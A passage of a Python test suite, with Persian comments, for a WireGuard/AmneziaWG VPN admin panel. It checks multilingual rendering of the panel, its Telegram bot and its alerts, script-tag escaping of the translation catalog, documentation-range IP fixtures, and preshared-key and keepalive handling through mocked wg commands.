    def test_auto_disable_reason_is_stored_as_a_catalog_key(self):
        """دلیلِ قطع/حذفِ خودکار باید کلید ذخیره شود، نه متنِ فارسی.

        ردیفِ تاریخچه داده است و ماندگار؛ متنِ فارسی در آن برای همیشه در
        رابطِ en/ru/zh فارسی می‌ماند.
        """
        src = _read_panel_source()
        self.assertIn('det = "ui.audit.reason." + reason', src)
        for reason in ("expired", "quota", "total_cap"):
            with self.subTest(reason=reason):
                self.assertIn("ui.audit.reason." + reason, self.m.I18N)
        self.assertIn("startsWith('ui.audit.reason.')", src,
                      "auditDetail پارامترِ دلیل را ترجمه نمی‌کند")

    def test_s4_errors_are_translatable_keys(self):
        """خطای پیکربندیِ MEGA S4 کلیدِ api.* است تا به زبانِ درخواست برسد."""
        from unittest import mock
        with mock.patch("builtins.open", side_effect=OSError):
            err = self.m._s4_target("panel")[3]
        self.assertIn(err, self.m.I18N)
        self.assertTrue(err.startswith("api."), err)

    def test_bot_has_no_hardcoded_persian(self):
        """هیچ رشتهٔ فارسیِ کاربر-روی نباید در کلاسِ ربات بماند.

        گاردِ خانوادگی: رباتِ per-chat یعنی دو مدیر با دو زبان هم‌زمان
        پاسخ می‌گیرند؛ یک رشتهٔ جامانده به هر دو فارسی می‌دهد. داک‌استرینگ
        متنِ کاربر نیست و کنار گذاشته می‌شود.
        """
        import ast
        src = _read_panel_source()
        cls = next(n for n in ast.parse(src).body
                   if isinstance(n, ast.ClassDef) and n.name == "TelegramBot")
        docs = set()
        for node in ast.walk(cls):
            body = getattr(node, "body", None)
            if (isinstance(body, list) and body
                    and isinstance(body[0], ast.Expr)
                    and isinstance(body[0].value, ast.Constant)
                    and isinstance(body[0].value.value, str)):
                d = body[0].value
                docs.update(range(d.lineno, (d.end_lineno or d.lineno) + 1))
        bad = [(n.lineno, n.value[:60]) for n in ast.walk(cls)
               if isinstance(n, ast.Constant) and isinstance(n.value, str)
               and re.search(r"[؀-ۿ]", n.value) and n.lineno not in docs]
        self.assertEqual(bad, [], "رشتهٔ فارسیِ سخت‌کد در ربات")

    def test_bot_language_is_per_chat(self):
        """زبانِ ربات باید per-chat باشد و کاربرِ ناشناخته به فارسی بیفتد."""
        m = self.m
        self.assertEqual(m.bot_lang(123456789), m.DEFAULT_LANG)
        for code in m.LANGS:
            self.assertEqual(m.norm_lang(code), code)
        # هر کلیدی که self.T صدا می‌زند باید ترجمه داشته باشد
        src = _read_panel_source()
        for key in set(re.findall(r"self\.T\('([\w.]+)'", src)):
            with self.subTest(key=key):
                self.assertIn(key, m.I18N, "کلیدِ self.T بی‌ترجمه")

    def test_alerts_have_no_hardcoded_persian(self):
        """پیامِ هشدار باید از کاتالوگ بیاید — شاملِ رشته‌ای که **بیرونِ**
        فراخوانی ساخته شده.

        زبانِ هشدار = زبانِ مالکِ ربات (خواستهٔ کاربر، ۱۲ اوت ۲۰۲۶)، چون
        چتِ هشدار گروهی است و «زبانِ گیرنده» تعریف‌شده نیست.

        🪤 نسخهٔ قبلیِ این گارد **سبز بود و معنایش آن نبود که نامش
        می‌گفت.** فقط `ast.Constant` ِ داخلِ خودِ Call را می‌دید، پس دو
        شکل نامرئی می‌ماندند:

          ۱. `msg = "…فارسی…"` و بعد `ALERTS.edge(k, good, msg)` —
             ثابت در دستورِ دیگری است و walk هرگز آنجا را نمی‌دید.
             ۱۹ فراخوانی آرگومانِ غیرثابت داشتند؛ دو پیامِ تونل و
             خروجیِ `drop_alert_text` واقعاً ترجمه‌نشده بودند.
          ۲. `send_now` اصلاً در فهرستِ نام‌ها نبود، در حالی که یکی از
             دو فراخوانی‌اش پیامِ تستِ فارسیِ درجا داشت.

        ⚠️ **محدودیتِ آگاهانه: ردیابی درون‌تابعی است.** متغیری که در
        تابعِ دیگری مقدار می‌گیرد دیده نمی‌شود؛ تحلیلِ کاملِ جریانِ داده
        برای این مسئله بیش‌ازحد است. این جمله عمداً اینجاست تا کسی
        سبزِ این گارد را بیش از آنچه هست نخواند — همان اشتباهی که
        اصلِ این یافته از آن آمد.
        """
        import ast
        SENDERS = ("event", "edge", "warp_event", "send_now")
        src = _read_panel_source()
        fa = lambda v: isinstance(v, str) and re.search(r"[؀-ۿ]", v)
        bad, seen = [], 0
        for fn in ast.walk(ast.parse(src)):
            if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            # رشته‌های فارسیِ نسبت‌داده‌شده در همین تابع
            local = {}
            for n in ast.walk(fn):
                if (isinstance(n, ast.Assign) and len(n.targets) == 1
                        and isinstance(n.targets[0], ast.Name)):
                    v = n.value
                    txt = (v.value if isinstance(v, ast.Constant) else
                           ast.unparse(v) if isinstance(v, (ast.BinOp, ast.JoinedStr))
                           else None)
                    if fa(txt):
                        local[n.targets[0].id] = str(txt)
            for n in ast.walk(fn):
                if not isinstance(n, ast.Call):
                    continue
                f = n.func
                nm = (f.attr if isinstance(f, ast.Attribute)
                      else getattr(f, "id", ""))
                if nm not in SENDERS:
                    continue
                seen += 1
                for sub in ast.walk(n):
                    if isinstance(sub, ast.Constant) and fa(sub.value):
                        bad.append((n.lineno, str(sub.value)[:40]))
                    elif isinstance(sub, ast.Name) and sub.id in local:
                        bad.append((n.lineno, "متغیرِ %s = %s"
                                    % (sub.id, local[sub.id][:30])))
        self.assertGreater(seen, 20,
                           "فقط %d فراخوانیِ هشدار دیده شد — SENDERS غلط است؟"
                           % seen)
        self.assertEqual(bad, [], "هشدار با متنِ فارسیِ سخت‌کد: %s" % bad)

    def test_alert_language_follows_bot_owner(self):
        """alert_lang باید زبانِ مالکِ ربات را بدهد و بدونِ مالک، فارسی."""
        m = self.m
        old = m.CONFIG.get("bot")
        try:
            m.CONFIG["bot"] = {"users": [{"id": "1", "role": "viewer",
                                          "lang": "zh"}]}
            self.assertEqual(m.alert_lang(), m.DEFAULT_LANG,
                             "زبانِ غیرِمالک نباید هشدار را عوض کند")
            m.CONFIG["bot"] = {"users": [{"id": "1", "role": "viewer",
                                          "lang": "zh"},
                                         {"id": "2", "role": "owner",
                                          "lang": "ru"}]}
            self.assertEqual(m.alert_lang(), "ru")
            m.CONFIG["bot"] = {"users": [{"id": "2", "role": "owner"}]}
            self.assertEqual(m.alert_lang(), m.DEFAULT_LANG,
                             "مالکِ بدونِ lang باید به فارسی بیفتد")
        finally:
            if old is None:
                m.CONFIG.pop("bot", None)
            else:
                m.CONFIG["bot"] = old

    def test_share_page_renders_in_four_languages(self):
        """صفحه‌ی اشتراک باید در هر چهار زبان کامل رندر شود.

        این صفحه در نخستین دورِ چهارزبانه‌سازی جا افتاد و هیچ‌کدام از هشت
        گاردِ آن دور نگرفتش، چون همه به **سورس** نگاه می‌کردند و این یکی
        قالبِ HTML بود نه فراخوانیِ تابع. پس گاردش عمداً به **خروجیِ
        رندرشده** نگاه می‌کند — همان چیزی که به چشمِ گیرنده‌ی لینک می‌رسد.
        """
        m = self.m
        res = {"name": "guard-dev", "ip": "192.168.188.9",
               "client_conf": "[Interface]\nPrivateKey = X\n"}
        usage = {"rows": [{"t": "2026-08-01", "rx": 1, "tx": 2}],
                 "month": 1024, "quota_gb": 5}
        for lang in m.LANGS:
            html = m.render_share_page(res, usage, lang)
            self.assertIn('lang="%s"' % m.LANG_HTML[lang], html)
            self.assertIn('dir="%s"' % m.LANG_DIR[lang], html)
            for tok in ("__PAYLOAD__", "__LANGNAV__", "__SHARE_BOOTSTRAP__",
                        "__LANG__", "__DIR__"):
                self.assertNotIn(tok, html, "جای‌نگه‌دارِ پرنشده: " + tok)
            self.assertNotRegex(html, r"⟦|⟧|⟪|⟫",
                                "نشانه‌ی ترجمه‌ی جامانده در %s" % lang)
            # ارقامِ فارسی فقط در فارسی
            self.assertIn("_FA=%s;" % ("true" if lang == "fa" else "false"),
                          html)
            if lang == "fa":
                continue
            # متنِ دیدنی نباید فارسی باشد. سه استثنای عمدی: نامِ «فارسی» در
            # گزینشگرِ زبان، جدولِ ارقامِ گاردشده با _FA، و کامنتِ فارسیِ سورس.
            vis = re.sub(r"<style>.*?</style>", "", html, flags=re.S)
            vis = re.sub(r"^\s*//.*$", "", vis, flags=re.M)
            vis = vis.replace(">فارسی</a>", "></a>").replace("۰۱۲۳۴۵۶۷۸۹", "")
            self.assertNotRegex(
                vis, r"[؀-ۿ]",
                "متنِ فارسیِ ترجمه‌نشده در صفحه‌ی اشتراکِ %s" % lang)

    # ── رندرِ صفحه‌ی اصلی ────────────────────────────────────────────────
    # هشت گاردِ i18n ِ موجود همه **سورس** را می‌خوانند و دنبالِ الگوی فراخوانی
    # می‌گردند. صفحه‌ی اشتراک قالبی بود بدونِ فراخوانی، پس هر هشت‌تا سبز ماندند
    # در حالی که هنوز فارسیِ سخت‌کدشده بود. درسش: سطحِ کاربرپسند به گاردِ
    # **رندر** نیاز دارد، نه گاردِ سورسِ دیگر.

    def test_render_page_is_complete_in_four_languages(self):
        """صفحه‌ی اصلی باید در هر چهار زبان کامل رندر شود.

        پنج جایگزینی در render_page هست و هرکدام راهِ خودش را برای
        شکستِ بی‌صدا دارد: نشانه‌ی جایگزین‌نشده «⟦ui.x⟧» را روی صفحه
        می‌فرستد، __LANG__/__DIR__ ِ پرنشده چیدمان را می‌شکند، و
        __I18N_BOOTSTRAP__ ِ پرنشده یعنی window.__T تعریف‌نشده — که
        هر _t() را به برگرداندنِ کلیدِ خودش وامی‌دارد.
        """
        m = self.m
        for lang in m.LANGS:
            # وگرنه اولین زبان کش می‌شود و هر چهار بار همان برمی‌گردد،
            # یعنی تست سبز می‌ماند در حالی که یک رندر را سنجیده.
            m._PAGE_CACHE.clear()
            html = m.render_page(lang)
            with self.subTest(lang=lang):
                self.assertNotRegex(html, r"⟦[^⟧]+⟧",
                                    "نشانه‌ی escaped ِ جایگزین‌نشده")
                self.assertNotRegex(html, r"⟪[^⟫]+⟫",
                                    "نشانه‌ی raw ِ جایگزین‌نشده")
                for ph in ("__LANG__", "__DIR__", "__I18N_BOOTSTRAP__"):
                    self.assertNotIn(ph, html,
                                     "جای‌نگه‌دارِ %s جایگزین نشد" % ph)
                self.assertIn('window.__LANG="%s"' % lang, html)
                self.assertIn('lang="%s"' % m.LANG_HTML[lang], html)
                self.assertIn('dir="%s"' % m.LANG_DIR[lang], html)
                self.assertIn("window.__T=", html)
                self.assertNotIn("window.__T={}", html)
        m._PAGE_CACHE.clear()      # حالتِ ماژول است — برای بقیه‌ی تست‌ها تمیز

    def test_every_template_token_exists_in_the_catalog(self):
        """هر نشانه‌ی ⟦…⟧/⟪…⟫ در قالب‌ها باید کلیدی واقعی باشد.

        🪤 گاردِ «نشانه‌ی جایگزین‌نشده» این را **نمی‌گیرد** و فرضِ شهودی
        غلط است: `t()` هم مثلِ `_t` ِ سمتِ JS کلیدِ ناشناخته را *خودش*
        برمی‌گرداند (خطِ ۱۴۰: «کلیدِ ناشناخته خودِ کلید را برمی‌گرداند»).
        پس نشانه همیشه جایگزین می‌شود — فقط با رشته‌ی خامِ «ui.x» به‌جای
        متن. یعنی خروجی نه «⟦ui.x⟧» است که در چشم بزند، بلکه «ui.x» که
        شبیهِ یک برچسبِ عجیب اما ممکن به‌نظر می‌رسد. آزموده شد: تزریقِ
        ⟦ui.definitely.not.a.key⟧ در PAGE_HTML گاردِ نشانه را قرمز
        **نکرد**؛ همین گارد کرد.
        """
        m = self.m
        cat = set(m.I18N)
        for name in ("PAGE_HTML", "SHARE_HTML"):
            tmpl = getattr(m, name)
            toks = (set(m._TOKEN_RE.findall(tmpl))
                    | set(m._TOKEN_RAW_RE.findall(tmpl)))
            with self.subTest(template=name):
                self.assertTrue(toks, "%s هیچ نشانه‌ای ندارد — ساختار عوض شده؟"
                                % name)
                self.assertEqual(sorted(toks - cat), [],
                                 "%s: نشانه‌ی بدونِ کلیدِ کاتالوگ" % name)

    def test_catalog_json_cannot_close_the_script_tag(self):
        """سخت‌سازیِ `</` در JSON ِ کاتالوگ نباید برداشته شود.

        کاتالوگ داخلِ <script> تزریق می‌شود؛ ترجمه‌ای که «</script>»
        داشته باشد بدونِ این جایگزینی تگ را می‌بندد و بقیه‌ی صفحه
        به‌عنوانِ HTML خوانده می‌شود. این گارد با کلیدِ ساختگی می‌سنجد،
        نه با اتکا به اینکه امروز چنین ترجمه‌ای در کاتالوگ نیست.
        """
        m = self.m
        m._PAGE_CACHE.clear()
        real = m.ui_catalog
        m.ui_catalog = lambda lang: {"ui.x": "</script><b>x"}
        try:
            html = m.render_page("en")
        finally:
            m.ui_catalog = real
            m._PAGE_CACHE.clear()
        boot = html.split("window.__T=")[1][:200]
        self.assertNotIn("</script>", boot,
                         "JSON ِ کاتالوگ می‌تواند تگ script را ببندد")
        self.assertIn("<\\/script>", boot, "سخت‌سازیِ `</` برداشته شده")

    def test_non_persian_renders_have_no_leftover_persian(self):
        """رندرِ غیرفارسی نباید متنِ فارسیِ ترجمه‌نشده داشته باشد.

        استثناها نام‌بُرده‌اند، نه آستانه‌ی مبهم: (۱) گزینه‌های گزینشگرِ
        زبان که عمداً به خطِ خودشان می‌مانند، (۲) کامنت‌های سورس — از
        جمله کامنتِ HTML، که به مرورگر می‌رسد ولی دیده نمی‌شود، و
        (۳) بلاکِ کاتالوگ که همه‌ی زبان‌ها را دارد.

        اندازه‌گیریِ ۱۳ اوت ۲۰۲۶: بعد از این سه استثنا، هر سه زبان
        **صفر** نشت دارند. اگر روزی عددی جز صفر شد، رشته‌ی تازه‌ای
        ترجمه‌نشده مانده.
        """
        m = self.m
        for lang in [x for x in m.LANGS if x != "fa"]:
            m._PAGE_CACHE.clear()
            html = m.render_page(lang)
            body = re.sub(r"<!--.*?-->", "", html, flags=re.S)
            body = re.sub(r"//[^\n]*", "", body)
            body = re.sub(r"/\*.*?\*/", "", body, flags=re.S)
            body = body.split("window.__T=")[0] + body.split("</script>")[-1]
            # گزینه‌های گزینشگرِ زبان: <option value="fa">فارسی</option>
            body = re.sub(r"<option[^>]*>[^<]*</option>", "", body)
            with self.subTest(lang=lang):
                self.assertEqual(
                    re.findall(r"[؀-ۿ]{4,}", body), [],
                    "متنِ فارسیِ ترجمه‌نشده در رندرِ %s" % lang)
        m._PAGE_CACHE.clear()

    def test_share_route_passes_negotiated_language(self):
        """رندرِ چهارزبانه بی‌فایده است اگر مسیر زبان را پاس ندهد.

        دقیقاً همین سیم‌کشی بود که جا افتاده بود؛ خودِ _lang از قبل
        می‌گفت صفحه‌ی اشتراک را هم پوشش می‌دهد.
        """
        import ast
        src = _read_panel_source()
        calls = [n for n in ast.walk(ast.parse(src))
                 if isinstance(n, ast.Call)
                 and isinstance(n.func, ast.Name)
                 and n.func.id == "render_share_page"]
        self.assertTrue(calls, "فراخوانیِ render_share_page پیدا نشد")
        for c in calls:
            self.assertEqual(
                len(c.args) + len(c.keywords), 3,
                "render_share_page در خطِ %d زبان را پاس نمی‌دهد" % c.lineno)

    def test_server_fixtures_use_documentation_range(self):
        """فیکسچرِ «خودِ سرور» باید از رنجِ مستندسازی باشد، نه زیرساختِ واقعی.

        تا ۱۳ اوت ۲۰۲۶ بلاکِ /29 واقعیِ سرور اینجا بود. هیچ تستی از آن
        سود نمی‌برد — همه فقط *روابطِ* بین آدرس‌ها را می‌سنجند (خودِ سرور،
        گیت‌وی، همسایه، سابنتِ دربرگیرنده) و با هر پیشوندی سبز می‌مانند.
        پس نگه‌داشتنِ آدرسِ واقعی صرفاً افشا بود.

        گارد به‌جای «آن بلاکِ خاص نباشد» نوشته شده تا خودش آدرسِ واقعی را
        در مخزن ثبت نکند — قاعده مثبت است: باید داخلِ RFC 5737 باشد.
        """
        import ipaddress
        DOC = [ipaddress.ip_network(n) for n in
               ("192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24")]

        def in_doc(value):
            net = ipaddress.ip_network(value, strict=False)
            return any(net.subnet_of(d) for d in DOC)

        for name, value in (("SRV_IP", SRV_IP), ("SRV_GW", SRV_GW),
                            ("SRV_NB", SRV_NB), ("SRV_NET", SRV_NET),
                            ("SRV_SUPERNET", SRV_SUPERNET)):
            self.assertTrue(
                in_doc(value),
                "%s = %s بیرونِ رنجِ مستندسازیِ RFC 5737 است — آدرسِ واقعیِ "
                "زیرساخت نباید فیکسچر شود" % (name, value))

        # روابطی که تست‌ها واقعاً به آن‌ها تکیه دارند، حفظ شده باشند
        net = ipaddress.ip_network(SRV_NET)
        self.assertIn(ipaddress.ip_address(SRV_IP), net, "سرور در سابنتِ خودش")
        self.assertIn(ipaddress.ip_address(SRV_GW), net, "گیت‌وی در همان سابنت")
        self.assertIn(ipaddress.ip_address(SRV_NB), net, "همسایه در همان سابنت")
        self.assertTrue(net.subnet_of(ipaddress.ip_network(SRV_SUPERNET)),
                        "SRV_SUPERNET باید سابنتِ سرور را دربرگیرد")

        # دو فایلِ تستِ دیگر هم همین نقش را فیکسچر می‌کنند. عمداً *همه‌ی*
        # آدرس‌هایشان سنجیده نمی‌شود: آن‌ها به‌درستی آدرسِ عمومیِ واقعی
        # دارند (anycast ِ WARP، رنج‌های گوگل) که خودشان موضوعِ تست‌اند.
        # فقط خطوطی سنجیده می‌شوند که نقشِ «آدرسِ خودِ ما» را می‌سازند.
        # `is_loop_target` عمداً بیرون است: هر دو جهت را می‌سنجد و خطوطی
        # دارد که مقصدِ عمومیِ واقعی را «غیرِخودی» اعلام می‌کنند.
        ROLE = re.compile(r"LOCAL_ADDRS|default via")
        for fname in ("test_sni_splitter.py", "test_tunnel_guard.py"):
            path = os.path.join(HERE, fname)
            if not os.path.exists(path):
                continue
            with open(path, encoding="utf-8") as fh:
                lines = fh.read().split("\n")
            for n, line in enumerate(lines, 1):
                if not ROLE.search(line):
                    continue
                for addr in re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", line):
                    try:
                        ip = ipaddress.ip_address(addr)
                    except ValueError:
                        continue
                    if ip.is_private or ip.is_loopback or ip.is_multicast:
                        continue
                    self.assertTrue(
                        in_doc(addr),
                        "%s:%d آدرسِ %s را در نقشِ «خودِ سرور» فیکسچر کرده "
                        "— از RFC 5737 استفاده کن" % (fname, n, addr))

    def test_no_localized_text_in_prometheus_labels(self):
        """برچسبِ متریک نباید به زبانِ رابط وابسته باشد."""
        for name, addrs in [("eth0", ["9.9.9.9"]), ("wg21", []), ("lo", [])]:
            role = self.m.classify_iface(name, addrs)[1]
            self.assertFalse(
                re.search(r"[؀-ۿ]", role),
                "برچسبِ نقشِ متریک فارسی شد: %r" % role)

    def test_read_proc_net_dev(self):
        sample = (
            "Inter-|   Receive                            |  Transmit\n"
            " face |bytes packets errs drop fifo frame compressed multicast|"
            "bytes packets errs drop fifo colls carrier compressed\n"
            "  eth0: 1000 5 0 0 0 0 0 0 2000 6 0 0 0 0 0 0\n"
            " awg1: 300 2 0 0 0 0 0 0 400 3 0 0 0 0 0 0\n")
        p = os.path.join(self.tmp, "netdev")
        with open(p, "w") as f:
            f.write(sample)
        orig = "/proc/net/dev"
        import builtins
        real_open = builtins.open
        def fake_open(path, *a, **k):
            if path == "/proc/net/dev":
                return real_open(p, *a, **k)
            return real_open(path, *a, **k)
        builtins.open = fake_open
        try:
            d = self.m.read_proc_net_dev()
        finally:
            builtins.open = real_open
        self.assertEqual(d["eth0"], (1000, 2000))
        self.assertEqual(d["awg1"], (300, 400))

    def test_awg_peer_line_parses_as_9_fields(self):
        # خط peer در awg هم دقیقاً ۹ فیلد است (مثل wg)
        line = ("awg1\tPUBKEY=\t(none)\t1.2.3.4:41641\t0.0.0.0/0\t"
                "1784204458\t1660892594440\t146775710723\toff")
        self.assertEqual(len(line.split("\t")), 9)

    # -------------------------------------------- PSK و override و اشتراک
    def test_add_peer_with_psk_and_overrides(self):
        m = self.m
        ov = {"c_dns": "9.9.9.9", "c_mtu": 1380, "c_keepalive": 15,
              "c_allowed": "10.0.0.0/8"}
        res, err = m.add_peer("wgtest", "pskuser", use_psk=True, overrides=ov)
        self.assertIsNone(err)
        c = res["client_conf"]
        self.assertIn("PresharedKey = FAKE_PSK", c)
        self.assertIn("MTU = 1380", c)
        self.assertIn("DNS = 9.9.9.9", c)
        self.assertIn("AllowedIPs = 10.0.0.0/8", c)
        self.assertIn("PersistentKeepalive = 15", c)
        self.assertTrue(m.block_psk("wgtest", "pskuser"))

    def _server_block(self, name):
        """بلوکِ سمتِ سرورِ یک پیر از روی فایلِ کانفیگ."""
        for chunk in self.read_conf().split("#!!!")[1:]:
            if chunk.splitlines()[0].strip() == name:
                return chunk
        return ""

    def test_add_peer_writes_server_side_keepalive(self):
        """keepalive باید سمتِ سرور هم نوشته شود، نه فقط در کانفیگِ کلاینت.

        بدونِ آن، اگر کلاینت keepalive نفرستد نگاشتِ NATِ اپراتور منقضی
        می‌شود و تونل یک‌طرفه می‌میرد: سرور به endpointِ کهنه هندشیک
        می‌فرستد و هیچ بسته‌ای برنمی‌گردد (حادثه‌ی ۱۴۰۵-۰۵-۰۱ / abab).
        """
        m = self.m
        res, err = m.add_peer("wgtest", "kauser", use_psk=False)
        self.assertIsNone(err)
        self.assertIn("PersistentKeepalive = 25", self._server_block("kauser"))
        # و باید زنده هم اعمال شده باشد تا تا ری‌استارتِ بعدی صبر نکنیم
        sets = [c for c in m._run_calls
                if c[:2] == ["wg", "set"] and res["ip"] + "/32" in c]
        self.assertTrue(sets, "هیچ wg set برای پیر تازه ثبت نشد")
        self.assertIn("persistent-keepalive", sets[-1])
        self.assertEqual(sets[-1][sets[-1].index("persistent-keepalive") + 1],
                         "25")

    def test_add_peer_server_keepalive_honours_override(self):
        m = self.m
        _, err = m.add_peer("wgtest", "kaover", use_psk=False,
                            overrides={"c_keepalive": 15})
        self.assertIsNone(err)
        self.assertIn("PersistentKeepalive = 15", self._server_block("kaover"))

    def test_set_peer_psk_toggle(self):
        m = self.m
        m.add_peer("wgtest", "u", use_psk=False)
        # ناظر عمداً block_psk است نه block_has_psk: دومی هیچ فراخوانِ
        # تولیدی نداشت و در پلنِ ۰۵۸ حذف شد. اولی همانی است که
        # ساختِ کانفیگِ کلاینت واقعاً استفاده می‌کند.
        self.assertFalse(m.block_psk("wgtest", "u"))
        ok, _ = m.set_peer_psk("wgtest", "u", True)
        self.assertTrue(ok and m.block_psk("wgtest", "u"))
        ok, _ = m.set_peer_psk("wgtest", "u", False)
        self.assertTrue(ok and not m.block_psk("wgtest", "u"))

    # ---- اعمالِ زنده‌ی PSK/keepalive ------------------------------------------
    # 🪤 غیرفعال‌کردن peer را کامل از کرنل برمی‌دارد؛ فعال‌کردنِ دوباره
    # باید PSK و keepalive را هم برگرداند، نه فقط allowed-ips — وگرنه
    # کاربرِ PSK‌دار (پیش‌فرض) تا ری‌استارتِ wg-quick هندشیک نمی‌کند.
    def _spy_psk_files(self):
        """run را می‌پوشاند و محتوای فایلِ preshared-key را در لحظه‌ی
        فراخوانی می‌خواند (فایل بعد از run حذف می‌شود)."""
        m = self.m
        orig = m.run
        seen = []

        def spy(cmd, timeout=20):
            if "preshared-key" in cmd:
                with open(cmd[cmd.index("preshared-key") + 1], "rb") as f:
                    seen.append(f.read())
            return orig(cmd, timeout)
        m.run = spy
        return seen

    def _set_calls_for(self, pub):
        return [c for c in self.m._run_calls
                if c[:2] == ["wg", "set"] and len(c) > 4 and c[4] == pub]

    def test_parse_user_blocks_exposes_psk_and_keepalive(self):
        m = self.m
        m.add_peer("wgtest", "pk", use_psk=True)
        blk = next(b for b in m.parse_user_blocks("wgtest") if b["name"] == "pk")
        self.assertTrue(blk["psk"].startswith("FAKE_PSK_"))
        self.assertEqual(blk["keepalive"], 25)
        # بلوکِ کامنت‌شده هم خوانده می‌شود (برای فعال‌کردنِ دوباره)
        m.set_peer_enabled("wgtest", "pk", False)
        blk = next(b for b in m.parse_user_blocks("wgtest") if b["name"] == "pk")
        self.assertFalse(blk["enabled"])
        self.assertTrue(blk["psk"] and blk["keepalive"] == 25)

    def test_enable_reapplies_psk_and_keepalive_in_one_wg_set(self):
        m = self.m
        res, err = m.add_peer("wgtest", "re", use_psk=True)
        self.assertIsNone(err)
        pub = next(b for b in m.parse_user_blocks("wgtest")
                   if b["name"] == "re")["public_key"]
        psk = m.block_psk("wgtest", "re")
        m.set_peer_enabled("wgtest", "re", False)
        self.assertEqual(self._set_calls_for(pub)[-1][-1], "remove")
        seen = self._spy_psk_files()
        del m._run_calls[:]
        ok, _ = m.set_peer_enabled("wgtest", "re", True)
        self.assertTrue(ok)
        calls = self._set_calls_for(pub)
        self.assertEqual(len(calls), 1, calls)
        c = calls[0]
        self.assertIn("preshared-key", c)
        self.assertIn("allowed-ips", c)
        self.assertEqual(c[c.index("allowed-ips") + 1], res["ip"] + "/32")
        self.assertIn("persistent-keepalive", c)
        self.assertEqual(c[c.index("persistent-keepalive") + 1], "25")
        self.assertEqual(seen, [(psk + "\n").encode()])

    def test_enable_without_psk_sends_no_preshared_key(self):
        m = self.m
        m.add_peer("wgtest", "nopsk", use_psk=False)
        pub = next(b for b in m.parse_user_blocks("wgtest")
                   if b["name"] == "nopsk")["public_key"]
        m.set_peer_enabled("wgtest", "nopsk", False)
        del m._run_calls[:]
        m.set_peer_enabled("wgtest", "nopsk", True)
        c = self._set_calls_for(pub)[0]
        self.assertNotIn("preshared-key", c)
        self.assertIn("persistent-keepalive", c)

    def test_enable_reports_live_apply_failure(self):
        m = self.m
        m.add_peer("wgtest", "fail", use_psk=True)
        m.set_peer_enabled("wgtest", "fail", False)
        orig = m.run
        m.run = lambda cmd, timeout=20: ((1, "", "boom")
                                        if "allowed-ips" in cmd
                                        else orig(cmd, timeout))
        ok, msg = m.set_peer_enabled("wgtest", "fail", True)
        self.assertFalse(ok)
        self.assertIn("boom", m.api_text(msg, "en"))

    def test_psk_removal_writes_an_empty_keyfile(self):
        """wg «حذفِ کلید» را فقط از فایلِ صفر بایتی می‌فهمد؛ یک \\n تنها
        «Invalid length key» است و پیش از این rc هم نادیده گرفته می‌شد."""
        m = self.m
        m.add_peer("wgtest", "rm", use_psk=True)
        seen = self._spy_psk_files()
        ok, _ = m.set_peer_psk("wgtest", "rm", False)
        self.assertTrue(ok)
        self.assertEqual(seen, [b""])
        self.assertFalse(m.block_psk("wgtest", "rm"))

    def test_psk_toggle_reports_live_apply_failure(self):
        m = self.m
        m.add_peer("wgtest", "rmf", use_psk=True)
        orig = m.run
        m.run = lambda cmd, timeout=20: ((1, "", "Invalid length key")
                                        if "preshared-key" in cmd
                                        else orig(cmd, timeout))
        resynced = []
        m.WATCHER = types.SimpleNamespace(resync=lambda: resynced.append(1))
        ok, msg = m.set_peer_psk("wgtest", "rmf", False)
        self.assertFalse(ok)
        self.assertIn("Invalid length key", m.api_text(msg, "en"))
        # بدونِ resync: ناظر باید همین دلتا را دوباره امتحان کند
        self.assertEqual(resynced, [])

    def test_a_failed_live_enable_toggle_leaves_the_watcher_to_retry(self):
        """شکستِ wg set نباید حالتِ ناظر را «اعمال‌شده» ثبت کند.

        resync پیش از بازگشتِ خطا، snapshot ِ فایلِ تازه را به ناظر می‌داد؛
        ناظر دیگر تفاوتی نمی‌دید و کرنل تا ری‌استارت ناهمخوان می‌ماند.
        """
        m = self.m
        m.add_peer("wgtest", "tgf", use_psk=False)
        resynced = []
        m.WATCHER = types.SimpleNamespace(resync=lambda: resynced.append(1))
        orig = m.run
        m.run = lambda cmd, timeout=20: ((1, "", "boom") if "remove" in cmd
                                        else orig(cmd, timeout))
        ok, _msg = m.set_peer_enabled("wgtest", "tgf", False)
        self.assertFalse(ok)
        self.assertEqual(resynced, [])
        m.run = orig
        ok, _msg = m.set_peer_enabled("wgtest", "tgf", True)
        self.assertTrue(ok)
        self.assertEqual(resynced, [1])

    def test_rotate_applies_psk_and_keepalive_with_new_key(self):
        m = self.m
        m.add_peer("wgtest", "rot", use_psk=True)
        psk = m.block_psk("wgtest", "rot")
        seen = self._spy_psk_files()
        # calls را خالی نمی‌کنیم: genkey ِ ساختگی از len(calls) شماره
        # می‌سازد و با شمارنده‌ی صفر همان کلیدِ قبلی را می‌داد.
        start = len(m._run_calls)
        res, err = m.rotate_peer_key("wgtest", "rot")
        self.assertIsNone(err)
        new_pub = next(b for b in m.parse_user_blocks("wgtest")
                       if b["name"] == "rot")["public_key"]
        c = [x for x in m._run_calls[start:]
             if x[:2] == ["wg", "set"] and x[4] == new_pub]
        self.assertEqual(len(c), 1, c)
        self.assertIn("preshared-key", c[0])
        self.assertIn("persistent-keepalive", c[0])
        self.assertEqual(seen, [(psk + "\n").encode()])
        self.assertIn("PresharedKey = " + psk, res["client_conf"])

    def test_apply_conf_delta_sends_psk_only_when_it_changed(self):
        m = self.m
        old = {"A": ("10.0.0.2/32", "P1", 25), "B": ("10.0.0.3/32", "", 0),
               "C": ("10.0.0.4/32", "P3", 25)}
        new = {"A": ("10.0.0.2/32", "P2", 25),      # PSK عوض شد
               "B": ("10.0.0.9/32", "", 25),         # فقط allowed/keepalive
               "D": ("10.0.0.5/32", "P4", 0)}        # تازه؛ C حذف
        seen = self._spy_psk_files()
        del m._run_calls[:]
        n = m.apply_conf_delta("wgtest", old, new)
        self.assertEqual(n, 4)
        a = self._set_calls_for("A")[0]
        self.assertIn("preshared-key", a)
        b = self._set_calls_for("B")[0]
        self.assertNotIn("preshared-key", b)
        self.assertEqual(b[b.index("allowed-ips") + 1], "10.0.0.9/32")
        d = self._set_calls_for("D")[0]
        self.assertIn("preshared-key", d)
        self.assertEqual(d[d.index("persistent-keepalive") + 1], "0")
        self.assertEqual(self._set_calls_for("C"), [["wg", "set", "wgtest",
                                                     "peer", "C", "remove"]])
        self.assertEqual(seen, [b"P2\n", b"P4\n"])
        # اینترفیسِ خاموش: هیچ wg set
        m.live_interfaces = lambda: []
        del m._run_calls[:]
        self.assertEqual(m.apply_conf_delta("wgtest", old, new), 0)
